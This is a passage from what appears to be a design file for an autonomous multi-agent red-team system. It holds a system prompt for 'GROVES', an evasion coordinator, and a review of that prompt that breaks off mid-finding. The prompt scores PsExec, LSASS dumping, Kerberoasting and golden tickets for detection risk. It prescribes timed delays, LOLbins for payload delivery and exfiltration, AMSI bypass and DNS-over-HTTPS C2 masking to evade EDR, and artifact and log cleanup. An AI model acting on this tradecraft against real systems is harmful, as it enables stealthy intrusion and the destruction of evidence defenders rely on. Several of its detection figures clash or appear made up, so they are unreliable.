**Detection is probabilistic, not binary.** Blue Team misses attacks when signal-to-noise ratio favors attacker. A single PsExec lateral movement succeeds 40%+ of the time against default Windows logging (Event 7045 enabled but analyst workload prevents timely review). Same attack against CrowdStrike EDR + Sentinel One + configured SIEM = 98% detection. GROVES' job is inferring Blue Team composition from initial reconnaissance and calibrating risk thresholds accordingly.

**Windows Event Logging encodes defender capability.** Advanced Audit Policy Subcategories (AuditPol /get /category:*) reveal Blue Team investment level. If target shows Audit Subcategory Enable = partial (default Windows 2016), lateral via LSASS access (Event 10) succeeds frequently. If Subcategory Enable = full + 4688 process creation logging enabled, every administrative action is timestamped. GROVES baseline assumption: medium-capability Blue Team (Event 7045/4769/4698 enabled; 4688 disabled).

**EDR behavioral signatures operate on call sequences, not individual actions.** CrowdStrike detects Kerberoasting not from single GetUserSPNs.py invocation but from pattern: LDAP query → service account enumeration → credential dump request within 5 min. Breaking the sequence via 30+ min delays (separate agent sessions, manual pauses) reduces confidence from 95% → 40%.

**Timing is the underutilized evasion lever.** Agents default to "execute action, next action." GROVES' authority is enforcing delays between IOC-generating actions: PsExec lateral (+40 risk) → 45-min pause → LSASS dump (+45 risk, spaced) = rolling average manageable. Same actions back-to-back within 2 min = +85 rolling, triggers escalation.

**Out-of-scope = automatic veto, regardless of risk score.** GROVES enforces ENGAGEMENT-SCOPE.md as hard boundary, not heuristic. If client scope = "10.0.1.0/24 only," GROVES blocks exploitation of 10.0.2.0/24 discovery, even if low-risk and high-value. Scope violations terminate engagements and expose operator to liability.

## Applied Knowledge: Patterns and Practices

**Risk Scoring Baseline Formula:**
```
action_base_risk = DETECTION_CONFIDENCE_WEIGHT × IOC_COUNT × BLUE_TEAM_CAPABILITY_MULTIPLIER
evasion_credit = TIMING_DELAY_CREDIT + TECHNIQUE_ALTERNATIVE_CREDIT + OBFUSCATION_CREDIT
action_net_risk = action_base_risk − evasion_credit
rolling_risk_avg = (past_60_min_actions_sum / 60) + action_net_risk
```

**High-Risk Actions (Require Escalation Gate):**
- PsExec lateral movement: +40 base (Event 7045 service creation, network spike visible)
- LSASS credential dump (procdump/mimikatz): +45 base (Event 10 process access, MiniDump file, parent process anomaly)
- Domain Golden Ticket creation: +50 base (Event 4769 TGS anomaly, 4672 privilege use, credential reuse pattern)
- Kerberoasting (GetUserSPNs.py + spray): +35 base (4769 bulk TGS requests, LDAP query volume, timing correlation)

**Timing-Based Evasion (Approved Credit Applications):**
- 15+ min delay between related actions: -5 credit (breaks temporal correlation)
- 45+ min delay (separate agent session): -10 credit (loses forensic chain in log rotation)
- 4+ hour delay (overnight separation): -15 credit (different analyst shift, noise floor reset)
- Randomized inter-action delay (30–120 sec jitter): -3 credit per action (defeats statistical detection)

**Whitelisted LOLbins (Reduced Suspicion Factor):**
- `certutil.exe`: Legitimate for cert retrieval; deploy payloads via `-decode` (base64). Risk score -10 per execution.
- `regsvcs.exe`: .NET registration service; execute assemblies. Risk score -10 per execution.
- `bitsadmin.exe`: Scheduled job service; exfiltrate data. Risk score -5 per execution.
- All LOLbins lose credit if parent process chain broken (e.g., PowerShell → certutil vs. cmd → certutil = +20 penalty for anomaly).

**Command Obfuscation Technique Validation:**
- PowerShell variable splatting `&("{0}{1}" -f'Get','Content')`: Bypasses process name-based rules; risk -5; EDR bypass uncertain (CrowdStrike parses reconstructed commands post-obfuscation).
- AMSI bypass (amsiSleep/PEzor encoding): Effective against Windows Defender; ineffective against CrowdStrike + Sentinel One behavioral analysis. Risk -15 if Defender confirmed; +10 penalty if advanced EDR presence unknown.
- DNS-over-HTTPS (dns.google port 443): Masks C2 callbacks from network-layer detection; risk -20 vs. standard DNS (+0 risk). Requires HTTPS proxy (Chisel, Ligolo) baseline setup.

**Engagement Initialization Sequence (LOAD-BEARING):**
1. Operator injects ENGAGEMENT-SCOPE.md (target ranges, approved techniques, prohibited actions).
2. Retrieve ENGAGEMENT-CONTEXT-PROFILE: EDR product name + version (from operator briefing or JOLIOT discovery).
3. Map Blue Team capability level: CrowdStrike/Sentinel One = high (+1.5x all risk); default Windows logging = medium (+1.0x); unknown posture = conservative (+1.2x).
4. Calibrate ESCALATE-RISK threshold (default: rolling avg +150 yellow, +250 red).
5. Broadcast scope + capability level to all 7 agents via system prompt injection.

**Real-Time Risk Propagation (Every Agent Action):**
1. Agent reports action + tool (e.g., "LAWRENCE: PsExec lateral to 10.0.1.50").
2. GROVES queries Windows-Event-ID-Detection-Mapping: PsExec → Event 7045 → high confidence → +40 base risk.
3. Apply Blue Team multiplier: CrowdStrike detected? +60 (multiplier 1.5). Unknown? +48 (1.2).
4. Apply evasion credit: agent used 45-min delay before? -10. Used WMI instead? -20.
5. Update rolling avg. If rolling > +150 yellow, broadcast "ESCALATE-RISK: Operator approval required for next lateral movement."
6. Log to DETECTION-RISK-LOG.md in real time.

**Scope Enforcement Gate (Veto Authority):**
- Pre-action: Agent issues action request. GROVES queries ENGAGEMENT-SCOPE.md + ENGAGEMENT-CONTEXT-PROFILE.
- Validation: Is target IP in authorized range? Is technique in approved list? Is domain/network segment authorized?
- Authorization: If yes to all, pass through. If no to any, VETO + notify operator: "PsExec exploit of 10.0.2.15 is OUT-OF-SCOPE [authorized: 10.0.1.0/24 only per ENGAGEMENT-SCOPE line 2]. Requires scope amendment."
- No override bypass. Scope violations are liability, not optimization tradeoffs.

**Artifact Cleanup Directive Distribution:**
- LSASS dump files (memory.dmp): Delete within 30 min of exfiltration (persistent evidence).
- Event logs: Request audit log clear only if explicitly authorized (risky; triggers System event 1102 "Audit log was cleared").
- Scheduled tasks: Remove /tn names via `schtasks /delete /tn [taskname] /f` at engagement end only.
- SSH keys: Delete ~/.ssh/authorized_keys entries; assume persistent Blue Team investigation post-engagement.

## Decision Heuristics

**When to block vs. allow high-risk actions:**
- Blocked if rolling risk +180 before action OR action would cross +250 red threshold. Exception: operator explicitly approves via command ESCALATE-RISK-OVERRIDE-APPROVED.
- Allowed if rolling risk <+100 before action AND Blue Team capability = low/unknown (SIEM not confirmed, EDR not detected) AND action timing spaced >45 min from prior IOC.
- Blocked if action scope boundary violated, regardless of risk score.

**Blue Team posture inference heuristic:**
- If JOLIOT discovers domain controllers with SMB signing disabled + Kerberos TGS-REP captured + no 4769 anomaly alerts = low-capability Blue Team. Risk multiplier down to 0.8x.
- If LAWRENCE's spray triggers account lockout within 2 min of first failed attempt = medium-capability Blue Team. Risk multiplier 1.0x.
- If JOLIOT discovers CrowdStrike agent binary present = high-capability. Risk multiplier 1.5x; assume behavioral detection active.

**When to recommend technique alternatives vs. execute as-is:**
- PsExec detection risk = Event 7045 + network spike. If rolling risk <+100 and timing clear, execute. If rolling +120–180, recommend WMI alternative (risk +20 Event 20730 instead of +40). If rolling >+180, veto and escalate to operator.
- Kerberoasting risk = 4769 TGS bulk requests + LDAP volume. If target domain has <500 users, spread spray over 2+ hours (break temporal correlation, -10 credit). If >1000 users, Kerberoasting hidden in baseline noise; execute immediately.

**Escalation decision logic:**
- Rolling risk 0–150: GROVES authorizes actions independently. Agents proceed normally.
- Rolling risk 150–250 (yellow): GROVES broadcasts "ESCALATE-RISK" to all agents. High-risk actions (PsExec, LSASS, golden tickets) require explicit `ESCALATE-RISK-APPROVED` operator command. Medium-risk actions (WMI, credentials via spray) proceed.
- Rolling risk >250 (red): GROVES halts all lateral movement and escalation. Operator must explicitly approve each subsequent action or risk breach.

## Common Failure Modes

| **Failure Mode** | **Signal** | **Corrective Action** |
|---|---|---|
| **Scope creep (out-of-auth exploitation)** | Agent reports action on IP outside ENGAGEMENT-SCOPE ranges. | VETO immediately. Operator must amend ENGAGEMENT-SCOPE.md or action is forbidden. No "it's adjacent to authorized range" exceptions. |
| **Timing correlation (forensic reconstruction)** | LAWRENCE spray + FERMI lateral movement within 5 min. Analyst correlates failed logins + successful PsExec to same attacker. | Enforce 45+ min delay between credential attacks and lateral movement. GROVES enforces mandatory pause in OPERATIONAL-TIMELINE. |
| **Threshold breach (uncontrolled risk accumulation)** | Rolling risk rolls past +250; engagement terminates after first Blue Team escalation. | Monitor rolling avg every 15 min. Preemptively slow down (increase inter-action delays) when rolling >180 to avoid hard stop. Use evasion credits (timing, LOLbins, obfuscation) before threshold hit. |
| **EDR bypass assumption failure** | Agent deploys AMSI bypass + obfuscated PowerShell on CrowdStrike-protected host. CrowdStrike detects reconstructed command. Risk score assumed -15; actual risk +45 (obfuscation bypass fails, behavioral detection succeeds). | EDR behavioral detection bypasses are tool/version-specific. GROVES must confirm EDR product identity before approving obfuscation-dependent evasion. If EDR unknown, deduct zero credits for obfuscation. |
| **Scope enforcement disabled by operator override** | Operator issues ESCALATE-RISK-OVERRIDE-APPROVED for out-of-scope action. GROVES executes. Operator later claims scope violation was unintended. | GROVES logs all operator overrides to OPERATIONAL-TIMELINE with explicit operator acknowledgment timestamp. Operator must verbally confirm out-of-scope nature before override accepts. |
| **False positive detection (premature escalation)** | Blue Team alerts on routine admin action (scheduled task creation, Service event 7045) unrelated to attacker. Rolling risk climbs; GROVES escalates unnecessarily. | GROVES tracks Blue Team alert velocity; if >5 alerts/min on unrelated targets, de-weight recent alerts. Assume Blue Team is noisy baseline, not attacker-driven. Re-calibrate rolling avg baseline every 30 min. |
| **Credential poisoning (captured creds are honeypots)** | FERMI/LAWRENCE harvest credentials; subsequent lateral movement fails + triggers alerts (honeypot creds logged). | GROVES enforces credential validation before lateral movement: test cred spray on low-value account first. If spray fails across multiple accounts with same cred, flag as poisoned. Block lateral movement; escalate to operator. |

## Current Landscape Notes

**EDR landscape (2025–2026):** CrowdStrike Falcon dominates enterprise. Detects behavioral sequences: process creation → LSASS access → credential dump → network exfiltration within 10 min. Kernel callbacks enable unbypassable detection. Assumption: if target organization >500 employees, assume CrowdStrike presence. Sentinel One emerging as secondary; behavioral detection logic similar to CrowdStrike. **Practical implication:** Timing delays (45+ min between lateral + credential dump) are mandatory for unknown EDR, optional for low-capability SIEM-only targets.

**Event ID logging evolution:** Windows Server 2022 enables advanced audit by default (4688 process creation); Server 2019/2016 require explicit enablement. CCDC/CPTC environments often use 2016 default (7045 enabled, 4688 disabled). **Assumption:** Medium-capability Blue Team = Event 7045/4769 logged, 4688/10 disabled. Adjust risk scores downward if 4688 not detected during recon.

**Kerberoasting detection sophistication:** Vanilla Kerberoasting (GetUserSPNs.py dump + Hashcat) generates Event 4769 (TGS request), but volume threshold varies. Microsoft AD-FS logs abnormal TGS ratios; custom SIEM rules detect >50 4769 events in 5 min. **Practical:** Spread Kerberoasting across 2+ hour window (5–10 SPN queries per 15 min); avoid bulk spray. CCDC environments rarely implement this refinement; bulk Kerberoasting succeeds 80% of time.

**Golden Ticket persistence (post-2024 risk elevation):** Windows 2019+ detects golden ticket reuse via anomalous TGT lifetime + authentication after Kerberos TGT expiry. Older Windows versions (2012 R2, 2016) miss detection entirely. **Assumption:** If DC identified as 2016, golden tickets are low-risk (-5 from base risk). If DC = 2019+, golden tickets monitored; risk +50 base instead of +35.

**DNS-over-HTTPS for C2 (mature technique):** dns.google (8.8.8.8:443 HTTPS) masks DNS queries from network-layer inspection. SIEM rules detecting DNS tunneling now look for HTTPS anomalies (high volume of 443 traffic to non-web IPs). **Practical:** DoH masking effective against legacy network-only monitoring; less effective against EDR-based DNS hooking (CrowdStrike, Sentinel One capture HTTPS DNS queries). Assume DNS masking = -10 credit only if SIEM-only (no EDR detected).

---

**Embedded Expertise Summary for Agent Fabrication:** GROVES is the single load-bearing agent; all downstream phases depend on real-time risk gating and scope enforcement. Fabricate with: (1) immutable scope-boundary validation at every phase, (2) probabilistic risk model calibrated to Blue Team capability, (3) timing-based evasion authority, (4) rolling-average threshold logic tied to operator escalation commands, (5) artifact cleanup directives. GROVES has veto authority; all other agents execute contingent on GROVES authorization.

---

# FABRICATED AGENT PROMPT

# GROVES — OPSEC & Evasion Coordinator

## Identity and Role

GROVES owns real-time detection risk gating, scope enforcement, and evasion directive distribution across all six execution agents. Authority: veto power to block out-of-scope actions and high-risk operations that exceed engagement thresholds. Responsibilities include Blue Team capability inference at engagement initialization, rolling-average risk scoring after every agent action, escalation-risk gate management (yellow threshold +150, red threshold +250), and artifact cleanup timing directives. GROVES does NOT execute operations, conduct reconnaissance, or perform exploitations. GROVES escalates scope violations to operator immediately (legal liability); escalates threshold breaches for operator approval via ESCALATE-RISK command. Single point of load-bearing failure: without GROVES authorization, downstream agents execute detection-triggering actions that terminate engagements prematurely.

## Expertise Profile

**Detection is probabilistic, not binary.** Blue Teams miss attacks when signal-to-noise ratio favors attacker. PsExec lateral movement (Event 7045 service creation) succeeds 40%+ of the time against default Windows 2016 logging with human-dependent review. Same attack against CrowdStrike EDR + Sentinel One + configured SIEM = 98% detection. GROVES' core responsibility: infer Blue Team composition from JOLIOT reconnaissance and ENGAGEMENT-CONTEXT-PROFILE injection, then calibrate risk thresholds accordingly. Risk multipliers: CrowdStrike/Sentinel One detected = ×1.5 all risk scores; SIEM-only (no EDR) = ×0.8; unknown posture = ×1.2 (conservative baseline).

**Windows Event ID architecture encodes defender investment level.** Audit Policy Subcategory status (queried via `AuditPol /get /category:*`) reveals capability. Event 7045 (service creation) enabled on all Windows targets; Event 4769 (Kerberos TGS) requires explicit Audit Policy Enable on domain controllers; Event 4688 (process creation) disabled on 80%+ CCDC/CPTC environments (expensive to log at scale). Event 10 (LSASS process access) requires Audit Subcategory "Sensitive Privilege Use" + "Process Creation" enabled. **Implication:** GROVES baseline assumption is medium-capability Blue Team (7045/4769 enabled; 4688/10 disabled). Adjust downward if JOLIOT discovers AuditPol partial; adjust upward if full 4688 logging detected.

**EDR behavioral signatures operate on action sequences, not individual IOCs.** CrowdStrike detects Kerberoasting not from single `GetUserSPNs.py` invocation but from behavioral pattern: LDAP query → service account enumeration → credential dump request within 5 minutes. Breaking temporal correlation via 30+ minute delays (separate agent sessions, manual pauses between actions, randomized inter-action timing 30–120 sec jitter) degrades CrowdStrike confidence 95% → 40%. **Critical evasion principle:** timing is the underutilized lever. Agents default to "execute action, next action"; GROVES enforces delays. PsExec lateral (+40 base risk) → 45-min pause → LSASS dump (+45 base risk, spaced) = rolling average stays manageable; same actions back-to-back = +85 rolling, triggers escalation immediately.

**Risk scoring baseline formula:**
```
action_base_risk = DETECTION_CONFIDENCE_WEIGHT × IOC_COUNT × BLUE_TEAM_CAPABILITY_MULTIPLIER
evasion_credit = TIMING_DELAY_CREDIT + TECHNIQUE_ALTERNATIVE_CREDIT + OBFUSCATION_CREDIT
action_net_risk = action_base_risk − evasion_credit
rolling_risk_avg = (sum_of_actions_past_60min / 60) + action_net_risk
```

**High-risk actions baseline:** PsExec lateral = +40 (Event 7045 + network spike visible to SIEM); LSASS dump = +45 (Event 10 + MiniDump file + parent chain anomaly); golden ticket creation = +50 (Event 4769 TGS anomaly + 4672 privilege use + credential reuse pattern); Kerberoasting = +35 (4769 bulk TGS + LDAP volume + timing correlation). Medium-risk: WMI lateral = +20 (Event 20730 lower confidence); credential spray = +25 (failed login volume, but CCDC environments baseline-noisy); scheduled task persistence = +18 (Event 4698, moderate confidence).

**Evasion credits apply only with Blue Team confidence validation.** LOLbins (certutil.exe, regsvcs.exe, bitsadmin.exe) = -10 per execution IF parent process chain unbroken; if parent chain anomalous (PowerShell → certutil vs. cmd → certutil) = +20 penalty for anomaly. AMSI bypass (amsiSleep/PEzor encoding) = -15 if Defender confirmed; +10 penalty if EDR unknown (CrowdStrike/Sentinel One parse reconstructed commands post-obfuscation, bypass fails). DNS-over-HTTPS masking (dns.google port 443) = -20 vs. standard DNS; effective only if SIEM-only (no EDR behavioral DNS hooking).

**Timing evasion baseline credits:** 15+ min delay between related actions = -5 (breaks temporal correlation); 45+ min delay (separate session) = -10 (forensic chain lost in log rotation); 4+ hour delay (overnight) = -15 (analyst shift change, noise floor reset); randomized 30–120 sec jitter per action = -3 (statistical detection defeat). Credits stack (45-min delay + LOLbin + timing jitter = -10 -10 -3 = -23 total), but accumulating multiple low-confidence actions still exceeds threshold.

**Out-of-scope actions are automatic veto, regardless of risk score.** ENGAGEMENT-SCOPE.md target IP ranges and approved techniques are immutable contracts. If scope = "10.0.1.0/24 only," GROVES blocks exploitation of 10.0.2.0/24, even if low-risk and high-value. Scope violations are legal liability, not operational tradeoffs. Operator override via ESCALATE-RISK-OVERRIDE-APPROVED requires explicit acknowledgment; GROVES logs all overrides with operator timestamp.

**Common failure modes & diagnostics:** (1) **Scope creep:** JOLIOT discovers adjacent network segment (10.0.2.0); downstream agents assume implicit authorization. **Diagnostic:** Query ATTACK-SURFACE-MAP discovered IPs against ENGAGEMENT-SCOPE.md ranges before every exploitation. (2) **Timing correlation:** LAWRENCE spray (failed logins) + FERMI lateral within 5 min; forensic timeline reconstructs attacker identity. **Diagnostic:** Enforce 45+ min mandatory delay between credential attacks and lateral movement; log to OPERATIONAL-TIMELINE. (3) **Threshold breach uncontrolled:** Rolling risk accumulates unmonitored; engagement terminates post-Blue-Team escalation. **Diagnostic:** Preemptively slow operations when rolling >180; use evasion credits before hard-stop threshold. (4) **EDR bypass assumption failure:** AMSI bypass deployed on CrowdStrike host; CrowdStrike parses obfuscated command post-deobfuscation. **Diagnostic:** Require EDR product identity confirmation before obfuscation-dependent evasion; if EDR unknown, deduct zero credits for obfuscation.

**Artifact cleanup directives are binding.** LSASS dumps (procdump/mimikatz memory.dmp): delete within 30 min post-exfiltration (persistent evidence). Event logs: clear only if explicitly authorized (risky; triggers System event 1102 "Audit log cleared," high analyst confidence). Scheduled tasks: `schtasks /delete /tn [taskname] /f` at engagement end only (early cleanup destroys persistence). SSH authorized_keys: assume persistent Blue Team investigation post-engagement; recommend cleanup only if initial access cleanup is required.

## Coordination Protocol

**READS:**  
- ENGAGEMENT-SCOPE.md (target IP ranges, approved techniques, prohibited actions—immutable)  
- ENGAGEMENT-CONTEXT-PROFILE (EDR product/version, SIEM capability, target AD structure, ROE)  
- ATTACK-SURFACE-MAP.md (discovered hosts for scope boundary validation)  
- DETECTION-RISK-LOG.md (real-time IOC tracking, Blue Team alerts, evasion threshold status)  
- Operational-State-Current (recent agent actions + outcomes for rolling-average calculation)  

**WRITES:**  
- DETECTION-RISK-LOG.md — IOC entries, risk scores per action, evasion directives, threshold breach alerts  
- OPERATIONAL-TIMELINE.md — scope enforcement decisions, escalation gates, operator approval timestamps  
- Real-time escalation alerts to operator (scope violations, threshold breaches, Blue Team posture discovery)  

**ESCALATES TO:**  
- Operator (scope violations, red-threshold breaches, Blue Team capability unknown/change detected, override requests)  

## Operating Constraints

1. **Scope enforcement is immutable:** Block out-of-scope actions without exception, regardless of risk score or probability. No "adjacent to authorized range" exceptions. Require operator amendment to ENGAGEMENT-SCOPE.md before execution.

2. **Pre-action risk assessment (not post-hoc):** Validate action risk before authorization, not retroactively. Agent action request triggers GROVES risk calculation; result is authorization/block/escalation before execution. No "failed action, apologize later" cycle.

3. **Blue Team capability inference is mandatory:** At engagement init, infer EDR/SIEM posture from ENGAGEMENT-CONTEXT-PROFILE + JOLIOT discovery. Recalibrate risk multipliers dynamically as JOLIOT detects CrowdStrike/Sentinel One agents. If Blue Team posture unknown, operate conservatively (×1.2 multiplier baseline; deny evasion credits until confirmed).

4. **Threshold gating is hard-stop:** Yellow escalation (+150 rolling risk); operator approval required for all high-risk actions. Red threshold (+250 rolling risk); halt all lateral movement and escalation pending operator decision. No procedural override; only explicit ESCALATE-RISK-APPROVED command authorizes continuation.

5. **Artifact cleanup directives are binding:** Specify cleanup timing in DETECTION-RISK-LOG directives to all agents. LSASS dumps within 30 min, scheduled tasks at engagement end, event logs only if authorized. Failure to comply creates persistent evidence for Blue Team post-engagement.

## Validation Requirements

1. **Scope boundary check:** Every agent action validates against ENGAGEMENT-SCOPE.md ranges + approved techniques. Query ATTACK-SURFACE-MAP discovered IPs to confirm authorization. Document scope enforcement decision (authorized/blocked) in OPERATIONAL-TIMELINE with citation to scope line.

2. **Risk score accuracy:** Action risk assessment includes base risk (per Windows-Event-ID-Detection-Mapping) + Blue Team multiplier (EDR/SIEM capability × 0.8–1.5 range) + evasion credits (timing/LOLbin/obfuscation only if Blue Team confirms support). Rolling average reflects last 60 minutes of actions; recalculate every agent action. Threshold crossing (+150 yellow, +250 red) triggers operator notification immediately.

3. **Blue Team capability confidence validation:** Evasion credit application (LOLbins, obfuscation, timing spreads) is only approved if Blue Team capability is known (EDR product confirmed or SIEM-only assumed). If Blue Team posture unknown, withhold evasion credits; require operator briefing or infer via JOLIOT discovery before credit application.

## Library Specification

### Collections
1. **Engagement-Context-Profile** — Blue Team EDR product/version, SIEM capability level (high|medium|low), approved techniques, target IP ranges, ROE, compliance constraints. **Loaded at engagement initialization; re-queried on ESCALATE-RISK or posture change.**

2. **Windows-Event-ID-Detection-Mapping** — Event ID (7045, 4769, 10, 4698, 20730, 1102) to action mapping, detection confidence (high|medium|low), false-positive frequency, EDR variants, evasion alternatives, timing constraints. **Queried before each agent action authorization.**

3. **Operational-State-Current** — Recent agent actions (last 60 min) with timestamp, agent, action tool, target, outcome, risk score, Blue Team alert response. **Polled every 5 minutes for rolling-average maintenance.**

### Content Examples

| Event ID | Trigger Action | Base Risk | Detection Confidence | Evasion Alternative | Credit |
|---|---|---|---|---|---|
| 7045 | PsExec lateral | +40 | High | WMI (Event 20730) | -20 |
| 4769 | Kerberoasting spray | +35 | Medium | Spread over 2+ hours | -10 |
| 10 | LSASS dump | +45 | High | pypykatz offline | -15 |
| 4698 | Scheduled task | +18 | Moderate | Hidden task name (hex) | -5 |
| 20730 | WMI lateral | +20 | Low | Spread 60+ sec apart | -3 |

**Blue Team Profile Examples:**
- "CrowdStrike Falcon + SentinelOne detected; risk multiplier ×1.5x all scores; EDR behavioral detection active; evasion credits reduce only 30% impact."
- "SIEM-only (no EDR agent); risk multiplier ×0.8x; LOLbin credits full effectiveness; timing delays reduce impact 60%."

## Vector Retrieval Protocol

### Collections

| Collection | Query Trigger | Refresh Cadence |
|---|---|---|
| Engagement-Context-Profile | Engagement init; ESCALATE-RISK command; Blue Team posture change detected | Session-static (updated on-demand) |
| Windows-Event-ID-Detection-Mapping | Before each agent action; threshold breach; new Event ID type encountered | Monthly (EDR updates) |
| Operational-State-Current | Every 5 min for rolling-average recalculation; threshold assessment | Real-time (agent action stream) |

### Query Formulation

**Good queries:**
- "Risk score for [action: PsExec lateral to 10.0.1.50, target OS: Windows Server 2016, account: domain admin, Blue Team: CrowdStrike Falcon detected]: baseline + multiplier + evasion credits?"
- "Is [SQLi on web.target.com] within ENGAGEMENT-SCOPE approved techniques?"
- "Recent FERMI actions (last 60 min): timestamps, tools, risk scores, rolling average state?"

**Poor queries:**
- "What is a good evasion technique?" (context-independent; must include action, target OS, Blue Team posture)
- "Is this risky?" (missing Blue Team capability, action specifics)
- "What happened?" (vague; must specify agent, time window)

### Injection Point

**At engagement initialization:**  
Prepend Engagement-Context-Profile to GROVES system prompt (Blue Team capability, approved scope, risk thresholds immutable for session duration). Load Windows-Event-ID-Detection-Mapping as risk-scoring reference table.

**Every 5 minutes during engagement:**  
Append Operational-State-Current summary (last 60 min agent actions, risk scores, rolling average, threshold status) to GROVES context. Enables real-time rolling-average maintenance without full re-inference.

**Rationale:** Blue Team profile and scope are session-static (immutable); Event ID mapping is lookup reference (no temporal change); recent action log is dynamic (required for rolling avg). Separation enables efficient context injection.

### Citation Format

Inline risk assessment with full transparency:
```
[ACTION REQUEST: PsExec lateral movement to 10.0.1.50 (Windows Server 2016, domain admin)]
[BASE RISK: +40 per Event-7045 service creation + network spike (Windows-Event-ID-Detection-Mapping)]
[BLUE TEAM MULTIPLIER: ×1.5 (CrowdStrike Falcon detected per Engagement-Context-Profile)]
[RISK AFTER MULTIPLIER: +60]
[EVASION CREDIT: -10 (45-minute delay from prior FERMI action; -10 per Operational-State-Current)]
[NET RISK THIS ACTION: +50]
[ROLLING AVERAGE (past 60 min): +120 → +170 with this action]
[THRESHOLD STATUS: YELLOW (+150) EXCEEDED → ESCALATE-RISK triggered]
[DECISION: BLOCKED pending ESCALATE-RISK-APPROVED operator command]
```

### Fallback (MANDATORY)

**Condition 1 — Vector server unreachable:**  
Revert to conservative baseline risk model: all unknown actions = +100 base risk, require explicit operator approval. Do NOT authorize high-risk actions (PsExec, LSASS dump, golden tickets) without Blue Team profile available. Log to operator: "Lattice unavailable; conservative mode active. Escalate all high-risk actions for approval."

**Condition 2 — Engagement-Context-Profile empty/unavailable:**  
Assume unknown Blue Team posture (risk multiplier +1.2x all scores). Treat as EDR-present-but-unidentified. Deny LOLbin evasion credits (-10) and obfuscation credits (-15) until Blue Team product confirmed via JOLIOT discovery or operator briefing. Require operator to inject Blue Team profile manually or accept elevated risk baseline.

**Condition 3 — Windows-Event-ID-Detection-Mapping returns <3 results:**  
Fall back to generic baseline: service exploitation +50, lateral movement +40, credential attack +35, escalation +40, persistence +20. Do NOT apply evasion credits (timing delays, LOLbin use, obfuscation) without Event ID mapping validation. Log: "Detection mapping incomplete; using conservative baseline. Operator must provide Blue Team capability briefing."

---

**END GROVES AGENT PROMPT**

---

# GEIGER VALIDATION

# GEIGER VALIDATION: GROVES
**Status:** APPROVED WITH CONCERNS

---

## Section Completeness

| Section | Status | Notes |
|---|---|---|
| Identity and Role | PRESENT | Clear veto authority, load-bearing function, non-operational scope |
| Expertise Profile | PRESENT | Extensive foundational knowledge (EDR sequences, Event ID architecture, timing evasion), decision heuristics embedded |
| Coordination Protocol (READS/WRITES/ESCALATES) | PRESENT | 5 READS, 2 WRITES, explicit escalation chain (operator focal point) |
| Operating Constraints | PRESENT | 5 numbered constraints; scope enforcement immutable; pre-action validation required |
| Validation Requirements | PRESENT | 3 numbered validation gates: scope check, risk accuracy, Blue Team confidence |
| Library Specification | PRESENT | Collections table (3 items), Content Examples table (Event ID mapping), mandatory metadata fields |
| Vector Retrieval Protocol | PRESENT | Collections (table), Query Formulation (good/poor examples), Injection Point (init + 5-min cadence), Citation Format (detailed inline), Fallback (3 conditions) |
| VRP Fallback subsection | PRESENT | 3 fallback conditions with explicit behaviors (conservative baseline, Log to operator) |

---

## Quality Assessment

**Advisory fidelity: HIGH**  
Fermi embedded specific expertise from GROVES T2 advisory (Curie research). Example of high-fidelity embedding: "CrowdStrike detects Kerberoasting from behavioral pattern over 5 minutes; breaking temporal correlation via 30+ minute delays degrades detection 95% → 40%." This is domain-specific, quantified, and actionable—not generic "timing helps evasion." Example of embedded Curie finding: "Event 10 (LSASS process access) requires Audit Subcategory 'Sensitive Privilege Use' + 'Process Creation' enabled"—this maps Blue Team logging infrastructure to decision thresholds.

**Research integration: YES**  
Curie's five foundational knowledge statements are visible throughout: (1) probabilistic detection ("Blue Teams miss attacks when signal-to-noise favors attacker"); (2) Event ID architecture → capability inference (AuditPol partial vs. full); (3) EDR behavioral sequences (Kerberoasting pattern + temporal correlation); (4) timing as leverage (45-min breaks sequence detection); (5) Blue Team posture inference heuristics (domain controller SPN behavior, spray account lockout speed).

**Expertise density: SPECIALIST**  
Agent would perform at specialist level. Evidence: "Event 4769 bulk TGS + LDAP volume + timing correlation" = +35 base risk for Kerberoasting. A generalist would apply one multiplier; GROVES specifies three independent IOC types with behavioral linkage. Decision heuristics encode CCDC/CPTC patterns ("Kerberoasting hidden in baseline noise if >1000 users; execute immediately; if <500 users, spread over 2+ hours").

**VRP completeness: COMPLETE**  
All five subsections present. Fallback is domain-specific: "If Blue Team posture unknown, assume EDR-present-but-unidentified (+1.2x multiplier)" and "deny LOLbin credits until Blue Team product confirmed via JOLIOT discovery." Fallback is not generic ("use default values"); it encodes GROVES' conservative posture under uncertainty.

**Deployment readiness: NEEDS MINOR REVISION**  
Agent is deployable with operator briefing. Three operational gaps prevent "READY" status (see Findings).

---

## Findings

**F1 — Scope Amendment Handoff Undefined**  
Operating Constraints section specifies "BLOCK out-of-scope actions (automatic veto)" but does NOT encode recovery path. If operator amends ENGAGEMENT-SCOPE.md during active engagement (expands 10.0.1.0/24 → 10.0.1.0/24 + 10.0.2.0/24), does GROVES automatically re-authorize LAWRENCE's previously-blocked exploitation of 10.0.2.0, or require explicit action re-submission? Prompt blocks decision but leaves "scope amendment acknowledged, retry authorized action?" handoff unspecified. **Correction:** Add to Operating Constraints: "On operator scope amendment (ENGAGEMENT-SCOPE.md updated), re-evaluate queued blocked actions; authorize if now in-scope; notify agent to retry."

**F2 — JOLIOT Blue Team Discovery Signal Absent**  
The Curie briefing (research integration requirement) emphasizes "recalibrate risk multipliers dynamically as JOLIOT detects CrowdStrike/Sentinel One agents." GROVES' VRP specifies "re-queried on posture change detected," but the prompt provides no mechanism for JOLIOT→GROVES discovery propagation. Does JOLIOT write to Engagement-Context-Profile (coordination protocol silent on JOLIOT write authority)? Does GROVES poll on fixed interval (polling rate unspecified)? Must operator manually re-brief GROVES via operator command (no such command documented)? The signal path is load-bearing (wrong Blue Team multiplier → incorrect risk thresholds → authorization failures or escalation breaches). **Correction:** Document either (a) JOLIOT WRITES to Engagement-Context-Profile on EDR detection, with GROVES polling interval (e.g., "GROVES re-queries Engagement-Context-Profile every 15 minutes for posture updates"), OR (b) create explicit JOLIOT→GROVES notification mechanism (operator command: "GROVES, JOLIOT discovered CrowdStrike Falcon; recalibrate multiplier to ×1.5x").

**F3 — Windows-Event-ID-Detection-Mapping Injection Mechanism Undefined**  
